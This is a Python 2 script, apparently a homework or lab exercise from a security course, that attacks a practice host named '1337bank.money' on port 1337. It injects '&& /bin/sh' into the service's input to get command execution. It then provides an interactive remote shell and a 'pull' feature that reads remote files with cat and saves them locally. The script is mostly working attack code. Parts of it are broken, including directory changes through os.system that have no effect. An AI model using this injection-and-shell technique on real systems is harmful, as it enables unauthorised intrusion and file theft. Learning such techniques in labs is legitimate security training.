"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import os

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    s.send("1337bank.money && /bin/sh\n")
    input = cmd

    if (input == "shell"):
	data = s.recv(1024)
	# continue interactive shell until user inputs "exit"
	while(input != "exit"):
	    if "ls" in input or "cat" in input:
		s.send(input + "\n")
		data = s.recv(1024)
		# print the output from ls or cat
		print(data)
	    else:
		#when it is a command like "cd", don't receive any data and don't print
		s.send(input + "\n")
	    # get new input
	    input = raw_input(">")

#outputs the string from the file location
def copy(remote):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    s.send("1337bank.money && /bin/sh\n")
    data = s.recv(1024)

    s.send("cat " + remote + "\n")
    data = s.recv(1024)
    return data




if __name__ == '__main__':
    input = raw_input("Input one of these commands: shell, pull, help, or exit: ")
    if input == "shell":
	execute_cmd(input)
    elif "pull" in input:
	# split the input by the spaces
	new_input = input.split(" ")
	# local file
        loc = new_input[2].split("/")
        stopper = len(loc) - 1
	count = 1
	# cd to the root
	os.system("cd\n")

	# continue to cd into the right directory
	while (count != stopper):
	     os.system("cd " + loc[count] + "\n")
	     count += 1

        data = copy(new_input[1])
	# open a new file with the given name
        file = open(loc[stopper],"w+")
        file.write(data)
        file.close()
    elif input != "quit":
	print("shell: Drop into an interactive shell and allow users to gracefully exit")
	print("pull <remote-path> <local-path>: Download files")
	print("help: Shows this help menu")
	print("quit: Quit the shell")
    else:
	print("")
